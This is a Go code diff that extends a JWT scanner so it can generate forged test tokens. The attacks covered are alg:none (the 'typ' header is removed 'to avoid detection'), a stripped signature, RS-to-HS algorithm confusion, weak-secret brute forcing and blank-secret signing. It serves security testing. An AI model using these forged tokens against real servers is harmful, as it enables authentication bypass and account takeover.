@@ -20,6 +20,7 @@ type ScanOptions struct {
 	MaxCrackAttempts int
 	SkipCrack        bool
 	SkipPayloads     bool
+	TestAttacks      bool // If true, generate test tokens for common attacks
 }
 
 // Issue represents a single finding from the scan.
@@ -29,14 +30,23 @@ type Issue struct {
 	Details     map[string]interface{} `json:"details,omitempty"`
 }
 
+// AttackToken represents a test token generated for a specific attack.
+type AttackToken struct {
+	AttackType        string `json:"attack_type"`
+	Description       string `json:"description"`
+	Token             string `json:"token"`
+	Vulnerable        bool   `json:"vulnerable,omitempty"` // Set to true if attack is confirmed
+}
+
 // ScanResult captures the decoded token and any identified issues.
 type ScanResult struct {
-	TokenType    string                 `json:"token_type"`   // JWT, JWE, Unknown
-	Algorithm    string                 `json:"algorithm"`
-	Header       map[string]interface{} `json:"header,omitempty"`
-	Claims       map[string]interface{} `json:"claims,omitempty"`
-	Issues       []Issue                `json:"issues,omitempty"`
-	CrackedSecret string                `json:"cracked_secret,omitempty"`
+	TokenType     string                 `json:"token_type"`   // JWT, JWE, Unknown
+	Algorithm     string                 `json:"algorithm"`
+	Header        map[string]interface{} `json:"header,omitempty"`
+	Claims        map[string]interface{} `json:"claims,omitempty"`
+	Issues        []Issue                `json:"issues,omitempty"`
+	CrackedSecret string                 `json:"cracked_secret,omitempty"`
+	AttackTokens  []AttackToken          `json:"attack_tokens,omitempty"` // Test tokens for exploitation
 }
 
 // Scan performs a lightweight security analysis of a JWT token.
@@ -126,7 +136,19 @@ func Scan(opts ScanOptions) (*ScanResult, error) {
 		} else if secret != "" {
 			res.CrackedSecret = secret
 			res.Issues = append(res.Issues, Issue{Type: "weak_secret", Description: "HMAC secret was found via wordlist", Details: map[string]interface{}{"attempts": attempts}})
+		} else if attempts > 0 {
+			// Report that cracking was attempted but secret not found
+			res.Issues = append(res.Issues, Issue{
+				Type:        "crack_attempted",
+				Description: fmt.Sprintf("Attempted to crack secret with %d attempts from wordlist, but secret was not found. The secret may be strong or not in the wordlist.", attempts),
+				Details:     map[string]interface{}{"attempts": attempts, "wordlist": opts.WordlistPath},
+			})
 		}
+	}
+
+	// Generate attack test tokens if requested
+	if opts.TestAttacks {
+		res.AttackTokens = generateAttackTokens(header, claims, alg, parts)
 	}
 
 	return res, nil
@@ -200,6 +222,7 @@ func crackHMACSecret(parts []string, alg, wordlistPath string, max int) (string,
 		return "", attempts, fmt.Errorf("error reading wordlist: %w", err)
 	}
 
+	// Return attempts count even if secret not found (for reporting)
 	return "", attempts, nil
 }
 
@@ -221,4 +244,133 @@ func computeHMAC(message, secret, alg string) ([]byte, error) {
 	default:
 		return nil, fmt.Errorf("unsupported HMAC algorithm: %s", alg)
 	}
+}
+
+// generateAttackTokens creates test tokens for common JWT attacks.
+func generateAttackTokens(header, claims map[string]interface{}, alg string, originalParts []string) []AttackToken {
+	var attacks []AttackToken
+
+	// 1. alg:none attack - Change algorithm to "none" and remove signature
+	if !strings.EqualFold(alg, "none") {
+		noneHeader := make(map[string]interface{})
+		for k, v := range header {
+			noneHeader[k] = v
+		}
+		noneHeader["alg"] = "none"
+		// Remove typ if present to avoid detection
+		delete(noneHeader, "typ")
+
+		noneToken := buildToken(noneHeader, claims, "")
+		attacks = append(attacks, AttackToken{
+			AttackType:  "alg_none",
+			Description: "Algorithm set to 'none' with empty signature - test if server accepts unsigned tokens",
+			Token:       noneToken,
+		})
+	}
+
+	// 2. Null signature attack - Remove signature entirely
+	if len(originalParts) == 3 {
+		nullSigToken := originalParts[0] + "." + originalParts[1] + "."
+		attacks = append(attacks, AttackToken{
+			AttackType:  "null_signature",
+			Description: "Token with empty signature - test if server accepts tokens without signature",
+			Token:       nullSigToken,
+		})
+	}
+
+	// 3. Algorithm confusion - Try switching from RS* to HS* (if original is RS*)
+	if strings.HasPrefix(strings.ToUpper(alg), "RS") {
+		// Try common weak secrets for algorithm confusion
+		weakSecrets := []string{"", "secret", "password", "123456", "admin", "test", "key"}
+		for _, secret := range weakSecrets {
+			hsAlg := "HS256"
+			confusionHeader := make(map[string]interface{})
+			for k, v := range header {
+				confusionHeader[k] = v
+			}
+			confusionHeader["alg"] = hsAlg
+
+			message := buildTokenParts(confusionHeader, claims)
+			mac, err := computeHMAC(message, secret, hsAlg)
+			if err == nil {
+				sig := base64.RawURLEncoding.EncodeToString(mac)
+				confusionToken := message + "." + sig
+				attacks = append(attacks, AttackToken{
+					AttackType:  "algorithm_confusion",
+					Description: fmt.Sprintf("Algorithm changed from %s to %s with secret '%s' - test if server uses public key as HMAC secret", alg, hsAlg, secret),
+					Token:       confusionToken,
+				})
+			}
+		}
+	}
+
+	// 4. Weak secrets test for HS* algorithms
+	if strings.HasPrefix(strings.ToUpper(alg), "HS") && len(originalParts) == 3 {
+		weakSecrets := []string{"", "secret", "password", "123456", "admin", "test", "key", "changeme", "default"}
+		message := originalParts[0] + "." + originalParts[1]
+		originalSig, err := base64.RawURLEncoding.DecodeString(originalParts[2])
+		if err == nil {
+			for _, secret := range weakSecrets {
+				mac, err := computeHMAC(message, secret, alg)
+				if err == nil {
+					// Check if this matches the original signature
+					if hmac.Equal(mac, originalSig) {
+						sig := base64.RawURLEncoding.EncodeToString(mac)
+						weakToken := message + "." + sig
+						attacks = append(attacks, AttackToken{
+							AttackType:  "weak_secret",
+							Description: fmt.Sprintf("Token signed with weak secret '%s' - CONFIRMED VULNERABLE", secret),
+							Token:       weakToken,
+							Vulnerable:  true,
+						})
+						// Found the secret, no need to test more
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// 5. Blank password attack for HS* algorithms
+	if strings.HasPrefix(strings.ToUpper(alg), "HS") {
+		message := originalParts[0] + "." + originalParts[1]
+		mac, err := computeHMAC(message, "", alg)
+		if err == nil {
+			sig := base64.RawURLEncoding.EncodeToString(mac)
+			blankToken := message + "." + sig
+			attacks = append(attacks, AttackToken{
+				AttackType:  "blank_password",
+				Description: "Token signed with empty string - test if server accepts blank password",
+				Token:       blankToken,
+			})
+		}
+	}
+
+	return attacks
+}
+
+// buildToken constructs a JWT token from header, claims, and signature.
+func buildToken(header, claims map[string]interface{}, signature string) string {
+	headerB64 := base64.RawURLEncoding.EncodeToString(mustJSON(header))
+	claimsB64 := base64.RawURLEncoding.EncodeToString(mustJSON(claims))
+	if signature == "" {
+		return headerB64 + "." + claimsB64 + "."
+	}
+	return headerB64 + "." + claimsB64 + "." + signature
+}
+
+// buildTokenParts builds the header.payload part of a token.
+func buildTokenParts(header, claims map[string]interface{}) string {
+	headerB64 := base64.RawURLEncoding.EncodeToString(mustJSON(header))
+	claimsB64 := base64.RawURLEncoding.EncodeToString(mustJSON(claims))
+	return headerB64 + "." + claimsB64
+}
+
+// mustJSON marshals a map to JSON, panicking on error (should never happen for valid maps).
+func mustJSON(v map[string]interface{}) []byte {
+	data, err := json.Marshal(v)
+	if err != nil {
+		panic(fmt.Sprintf("failed to marshal JSON: %v", err))
+	}
+	return data
 }
